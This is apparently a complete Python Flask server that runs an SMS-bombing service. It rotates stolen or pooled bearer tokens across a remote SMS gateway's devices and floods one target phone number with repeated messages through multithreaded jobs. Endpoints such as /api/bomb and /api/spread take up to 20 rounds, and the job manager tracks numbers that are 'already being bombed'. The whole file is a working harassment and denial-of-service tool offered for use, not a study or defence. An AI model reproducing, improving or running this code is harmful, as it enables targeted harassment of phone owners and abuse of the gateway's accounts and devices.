#!/usr/bin/env python3
"""
RAX ULTRA API — Optimized for Pro Ultra Instances
Auto-scales based on available resources
"""

import os
import sys
import time
import json
import random
import threading
import multiprocessing
import requests
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# AUTO-DETECT SYSTEM RESOURCES
# ============================================================

def detect_system_capability():
    """Auto-detect system resources and scale accordingly."""
    cpu_count = multiprocessing.cpu_count()
    ram_gb = 0
    
    # Try to detect RAM (Linux)
    try:
        with open('/proc/meminfo', 'r') as f:
            for line in f:
                if 'MemTotal' in line:
                    ram_kb = int(line.split()[1])
                    ram_gb = ram_kb / (1024 * 1024)
                    break
    except:
        ram_gb = 8  # Assume 8GB if can't detect
    
    # Check if running on Render Pro Ultra
    is_render = os.environ.get('RENDER', 'false') == 'true'
    instance_type = os.environ.get('INSTANCE_TYPE', 'free')
    
    # Detect Render instance type from environment
    if 'ULTRA' in os.environ.get('RENDER_INSTANCE_TYPE', ''):
        instance_type = 'ultra'
    elif 'PRO' in os.environ.get('RENDER_INSTANCE_TYPE', ''):
        instance_type = 'pro'
    
    # Scale based on detected resources
    if instance_type == 'ultra' or cpu_count >= 8:
        # Pro Ultra / High-end
        return {
            "max_workers": min(cpu_count * 20, 300),
            "max_concurrent_jobs": 50,
            "threads_per_job": min(cpu_count * 8, 200),
            "default_delay": 0.01,
            "batch_size": 100,
            "retries": 3,
            "instance_type": "ultra"
        }
    elif instance_type == 'pro' or cpu_count >= 4:
        # Pro / Mid-tier
        return {
            "max_workers": min(cpu_count * 12, 100),
            "max_concurrent_jobs": 20,
            "threads_per_job": min(cpu_count * 4, 80),
            "default_delay": 0.05,
            "batch_size": 50,
            "retries": 2,
            "instance_type": "pro"
        }
    else:
        # Free / Low-tier
        return {
            "max_workers": min(cpu_count * 4, 30),
            "max_concurrent_jobs": 5,
            "threads_per_job": min(cpu_count * 2, 20),
            "default_delay": 0.2,
            "batch_size": 20,
            "retries": 2,
            "instance_type": "free"
        }

# Detect and print system info
SYSTEM_CAP = detect_system_capability()
print(f"""
╔══════════════════════════════════════════════════════════╗
║  🚀 SYSTEM CAPABILITY DETECTED                          ║
╠══════════════════════════════════════════════════════════╣
║  Instance Type: {SYSTEM_CAP['instance_type'].upper()}                    ║
║  CPU Cores: {multiprocessing.cpu_count()}                               ║
║  Max Workers: {SYSTEM_CAP['max_workers']}                             ║
║  Concurrent Jobs: {SYSTEM_CAP['max_concurrent_jobs']}                            ║
║  Threads Per Job: {SYSTEM_CAP['threads_per_job']}                              ║
║  Default Delay: {SYSTEM_CAP['default_delay']}s                                ║
║  Batch Size: {SYSTEM_CAP['batch_size']}                                 ║
╚══════════════════════════════════════════════════════════╝
""")

# ============================================================
# CONFIG
# ============================================================

app = Flask(__name__)
CORS(app)

BASE_URL = "https://sms-rax.ai.studio"

# Dynamic limits
MAX_CONCURRENT_JOBS = SYSTEM_CAP['max_concurrent_jobs']
DEFAULT_THREADS = SYSTEM_CAP['threads_per_job']
DEFAULT_DELAY = SYSTEM_CAP['default_delay']
DEFAULT_BATCH_SIZE = SYSTEM_CAP['batch_size']
MAX_RETRIES = SYSTEM_CAP['retries']

# ============================================================
# TOKEN MANAGEMENT (same as before, but with rotation)
# ============================================================

def load_tokens_from_env():
    tokens = []
    for i in range(1, 21):
        token = os.environ.get(f"RAX_TOKEN_{i}")
        if token:
            tokens.append(token)
    return tokens

def load_tokens_from_file():
    try:
        with open("rax_tokens.json", 'r') as f:
            data = json.load(f)
            if isinstance(data, list):
                return [t.get('token') for t in data if t.get('token')]
    except:
        pass
    return []

def get_all_tokens():
    tokens = load_tokens_from_env()
    if not tokens:
        tokens = load_tokens_from_file()
    if not tokens:
        fallback = os.environ.get("FALLBACK_TOKEN")
        if fallback:
            tokens = [fallback]
    return tokens

# Token rotation counter
_token_index = 0
_token_lock = threading.Lock()

def get_next_token():
    """Round-robin token rotation for better distribution."""
    global _token_index
    tokens = get_all_tokens()
    if not tokens:
        return None
    with _token_lock:
        token = tokens[_token_index % len(tokens)]
        _token_index += 1
        return token

# ============================================================
# DEVICE MANAGEMENT (parallelized)
# ============================================================

def get_online_devices(token):
    try:
        resp = requests.get(
            f"{BASE_URL}/api/devices?key=CyberDemo",
            headers={"Authorization": f"Bearer {token}"},
            timeout=10
        )
        if resp.status_code == 200:
            data = resp.json()
            return [d.get('id') for d in data if d.get('status', False)]
    except:
        pass
    return []

def get_all_online_devices_parallel():
    """Fetch devices from all tokens in parallel."""
    tokens = get_all_tokens()
    if not tokens:
        return []
    
    all_devices = []
    with ThreadPoolExecutor(max_workers=min(len(tokens), 10)) as executor:
        futures = {executor.submit(get_online_devices, token): token for token in tokens}
        for future in as_completed(futures):
            devices = future.result()
            all_devices.extend(devices)
    
    return list(set(all_devices))

# ============================================================
# SMS SENDING (optimized)
# ============================================================

def send_sms(device_id, to, message, token, retry=MAX_RETRIES):
    url = f"{BASE_URL}/api/send"
    payload = {"deviceId": device_id, "phone": to, "message": message}
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    for attempt in range(retry + 1):
        try:
            resp = requests.post(url, json=payload, headers=headers, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('success'):
                    return {"success": True, "device": device_id}
            time.sleep(DEFAULT_DELAY * (attempt + 1))
        except:
            pass
    return {"success": False, "device": device_id}

# ============================================================
# JOB MANAGER (optimized for high concurrency)
# ============================================================

class JobManager:
    def __init__(self):
        self.lock = threading.Lock()
        self.jobs = {}
        self.active_targets = {}
        self.running = True
        self.executor = ThreadPoolExecutor(max_workers=SYSTEM_CAP['max_workers'])
    
    def create_job(self, job_type, target, message, **kwargs):
        with self.lock:
            if target in self.active_targets:
                existing_job_id = self.active_targets[target]
                return {
                    "success": False,
                    "error": f"Number {target} is already being bombed (Job ID: {existing_job_id})",
                    "existing_job_id": existing_job_id
                }
            
            active_jobs = sum(1 for j in self.jobs.values() if j['status'] == 'running')
            if active_jobs >= MAX_CONCURRENT_JOBS:
                return {
                    "success": False,
                    "error": f"Max concurrent jobs ({MAX_CONCURRENT_JOBS}) reached."
                }
            
            job_id = f"job_{int(time.time())}_{random.randint(100, 999)}"
            job_data = {
                "job_id": job_id,
                "type": job_type,
                "target": target,
                "message": message,
                "status": "pending",
                "created_at": datetime.now().isoformat(),
                "started_at": None,
                "finished_at": None,
                "stop_flag": False,
                "result": None,
                "kwargs": kwargs,
                "sent": 0,
                "failed": 0,
                "total": 0,
                "progress": 0,
                "threads": kwargs.get('threads', DEFAULT_THREADS)
            }
            
            self.jobs[job_id] = job_data
            self.active_targets[target] = job_id
            return {"success": True, "job_id": job_id, "job": job_data}
    
    def start_job(self, job_id, target_function, *args, **kwargs):
        with self.lock:
            if job_id not in self.jobs:
                return {"success": False, "error": "Job not found"}
            job = self.jobs[job_id]
            job['status'] = 'running'
            job['started_at'] = datetime.now().isoformat()
        
        # Submit to thread pool
        future = self.executor.submit(self._run_job, job_id, target_function, *args, **kwargs)
        future.add_done_callback(lambda f: self._job_complete(job_id))
        
        return {"success": True}
    
    def _run_job(self, job_id, target_function, *args, **kwargs):
        with self.lock:
            if job_id not in self.jobs:
                return
            job = self.jobs[job_id]
        
        try:
            result = target_function(job, *args, **kwargs)
            with self.lock:
                job['status'] = 'completed'
                job['result'] = result
                job['finished_at'] = datetime.now().isoformat()
                if job['target'] in self.active_targets and self.active_targets[job['target']] == job_id:
                    del self.active_targets[job['target']]
        except Exception as e:
            with self.lock:
                job['status'] = 'failed'
                job['result'] = {"error": str(e)}
                job['finished_at'] = datetime.now().isoformat()
                if job['target'] in self.active_targets and self.active_targets[job['target']] == job_id:
                    del self.active_targets[job['target']]
    
    def _job_complete(self, job_id):
        # Cleanup handler
        pass
    
    def stop_job(self, job_id):
        with self.lock:
            if job_id not in self.jobs:
                return {"success": False, "error": "Job not found"}
            job = self.jobs[job_id]
            if job['status'] not in ['running', 'pending']:
                return {"success": False, "error": f"Job is already {job['status']}"}
            job['stop_flag'] = True
            job['status'] = 'stopping'
            target = job['target']
            if target in self.active_targets and self.active_targets[target] == job_id:
                del self.active_targets[target]
            return {"success": True, "job_id": job_id}
    
    def stop_all(self):
        with self.lock:
            stopped = []
            for job_id, job in self.jobs.items():
                if job['status'] in ['running', 'pending']:
                    job['stop_flag'] = True
                    job['status'] = 'stopping'
                    target = job['target']
                    if target in self.active_targets and self.active_targets[target] == job_id:
                        del self.active_targets[target]
                    stopped.append(job_id)
            return {"success": True, "stopped": stopped, "count": len(stopped)}
    
    def get_job(self, job_id):
        with self.lock:
            return self.jobs.get(job_id)

# ============================================================
# BOMBING FUNCTIONS (optimized for Ultra)
# ============================================================

def spread_bomb(job, devices=None, threads=DEFAULT_THREADS):
    if devices is None:
        devices = get_all_online_devices_parallel()
    
    if not devices:
        return {"error": "No online devices available"}
    
    tokens = get_all_tokens()
    if not tokens:
        return {"error": "No tokens available"}
    
    total = len(devices)
    job['total'] = total
    sent = 0
    failed = 0
    
    # Use round-robin for token distribution
    device_token_map = {}
    for i, device_id in enumerate(devices):
        device_token_map[device_id] = tokens[i % len(tokens)]
    
    # Use high concurrency
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {}
        for device_id in devices:
            token = device_token_map[device_id]
            futures[executor.submit(send_sms, device_id, job['target'], job['message'], token)] = device_id
        
        for future in as_completed(futures):
            if job.get('stop_flag', False):
                break
            result = future.result()
            if result.get('success'):
                sent += 1
            else:
                failed += 1
            job['sent'] = sent
            job['failed'] = failed
            job['progress'] = round((sent + failed) / total * 100, 1)
    
    if job.get('stop_flag', False):
        return {"sent": sent, "failed": failed, "total": total, "stopped": True}
    
    return {"sent": sent, "failed": failed, "total": total, "success_rate": round(sent/total*100, 1) if total > 0 else 0}

def round_bomb(job, devices=None, threads=DEFAULT_THREADS, rounds=3, delay=DEFAULT_DELAY):
    if devices is None:
        devices = get_all_online_devices_parallel()
    
    if not devices:
        return {"error": "No online devices available"}
    
    total_sent = 0
    total_failed = 0
    
    for round_num in range(1, rounds + 1):
        if job.get('stop_flag', False):
            break
        
        round_result = spread_bomb(job, devices, threads)
        total_sent += round_result.get('sent', 0)
        total_failed += round_result.get('failed', 0)
        job['sent'] = total_sent
        job['failed'] = total_failed
        job['progress'] = round(round_num / rounds * 100, 1)
        
        if round_num < rounds:
            time.sleep(delay)
    
    if job.get('stop_flag', False):
        return {"sent": total_sent, "failed": total_failed, "rounds_completed": round_num - 1, "stopped": True}
    
    return {"sent": total_sent, "failed": total_failed, "rounds_completed": rounds, "success_rate": round(total_sent/(total_sent+total_failed)*100, 1) if (total_sent+total_failed) > 0 else 0}

# ============================================================
# GLOBAL JOB MANAGER
# ============================================================

job_manager = JobManager()

# ============================================================
# API ENDPOINTS (same as before)
# ============================================================

@app.route('/api/health', methods=['GET'])
def health():
    active_jobs = sum(1 for j in job_manager.jobs.values() if j['status'] == 'running')
    return jsonify({
        "status": "ok",
        "timestamp": datetime.now().isoformat(),
        "active_jobs": active_jobs,
        "active_targets": list(job_manager.active_targets.keys()),
        "total_devices": len(get_all_online_devices_parallel()),
        "tokens_available": len(get_all_tokens()),
        "instance_type": SYSTEM_CAP['instance_type'],
        "max_concurrent_jobs": MAX_CONCURRENT_JOBS,
        "threads_per_job": DEFAULT_THREADS
    })

@app.route('/api/devices', methods=['GET'])
def list_devices():
    devices = get_all_online_devices_parallel()
    return jsonify({"total": len(devices), "devices": devices[:200]})

@app.route('/api/spread', methods=['POST'])
def start_spread():
    data = request.json or {}
    to = data.get('to') or data.get('number')
    message = data.get('message')
    threads = int(data.get('threads', DEFAULT_THREADS))
    
    if not to or not message:
        return jsonify({"error": "Missing 'to' or 'message' fields"}), 400
    
    result = job_manager.create_job("spread", to, message, threads=threads)
    if not result['success']:
        return jsonify(result), 409 if "already being bombed" in result.get('error', '') else 429
    
    job_manager.start_job(result['job_id'], spread_bomb, threads=threads)
    
    return jsonify({
        "success": True,
        "job_id": result['job_id'],
        "message": f"Spread bomb started on {to}",
        "status": "running",
        "check_status": f"/api/jobs/{result['job_id']}",
        "instance_type": SYSTEM_CAP['instance_type'],
        "threads": threads
    })

@app.route('/api/bomb', methods=['POST'])
def start_bomb():
    data = request.json or {}
    to = data.get('to') or data.get('number')
    message = data.get('message')
    rounds = int(data.get('rounds', 3))
    threads = int(data.get('threads', DEFAULT_THREADS))
    delay = float(data.get('delay', DEFAULT_DELAY))
    
    if not to or not message:
        return jsonify({"error": "Missing 'to' or 'message' fields"}), 400
    if rounds < 1 or rounds > 20:
        return jsonify({"error": "Rounds must be between 1 and 20"}), 400
    
    result = job_manager.create_job("bomb", to, message, rounds=rounds, threads=threads, delay=delay)
    if not result['success']:
        return jsonify(result), 409 if "already being bombed" in result.get('error', '') else 429
    
    job_manager.start_job(result['job_id'], round_bomb, threads=threads, rounds=rounds, delay=delay)
    
    return jsonify({
        "success": True,
        "job_id": result['job_id'],
        "message": f"Bomb started on {to} with {rounds} rounds",
        "status": "running",
        "check_status": f"/api/jobs/{result['job_id']}",
        "instance_type": SYSTEM_CAP['instance_type']
    })

@app.route('/api/send', methods=['POST'])
def send_single():
    data = request.json or {}
    to = data.get('to') or data.get('number')
    message = data.get('message')
    
    if not to or not message:
        return jsonify({"error": "Missing 'to' or 'message' fields"}), 400
    
    token = get_next_token()
    if not token:
        return jsonify({"error": "No valid token available"}), 503
    
    devices = get_all_online_devices_parallel()
    if not devices:
        return jsonify({"error": "No online devices available"}), 503
    
    device_id = random.choice(devices)
    result = send_sms(device_id, to, message, token)
    
    if result.get('success'):
        return jsonify({
            "success": True,
            "to": to,
            "from": device_id,
            "message": message[:50] + "...",
            "timestamp": datetime.now().isoformat()
        })
    else:
        return jsonify({"success": False, "error": result.get('error', 'SMS failed')}), 500

@app.route('/api/jobs', methods=['GET'])
def list_jobs():
    limit = int(request.args.get('limit', 50))
    with job_manager.lock:
        jobs = list(job_manager.jobs.values())
        jobs.sort(key=lambda x: x.get('created_at', ''), reverse=True)
    return jsonify({"total": len(jobs), "jobs": jobs[:limit]})

@app.route('/api/jobs/<job_id>', methods=['GET'])
def get_job(job_id):
    job = job_manager.get_job(job_id)
    if not job:
        return jsonify({"error": "Job not found"}), 404
    return jsonify(job)

@app.route('/api/stop/<job_id>', methods=['POST'])
def stop_job(job_id):
    result = job_manager.stop_job(job_id)
    if not result['success']:
        return jsonify(result), 404
    return jsonify(result)

@app.route('/api/stop/all', methods=['POST'])
def stop_all():
    result = job_manager.stop_all()
    return jsonify(result)

@app.route('/api/stop/number/<target>', methods=['POST'])
def stop_target(target):
    with job_manager.lock:
        if target not in job_manager.active_targets:
            return jsonify({"error": f"No active bombing for {target}"}), 404
        job_id = job_manager.active_targets[target]
        result = job_manager.stop_job(job_id)
        if result['success']:
            return jsonify(result)
        return jsonify({"error": "Failed to stop"}), 500

@app.route('/api/active', methods=['GET'])
def active_targets():
    return jsonify({
        "active_targets": list(job_manager.active_targets.keys()),
        "count": len(job_manager.active_targets)
    })

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5001))
    debug = os.environ.get("DEBUG", "false").lower() == "true"
    
    app.run(host="0.0.0.0", port=port, debug=debug)
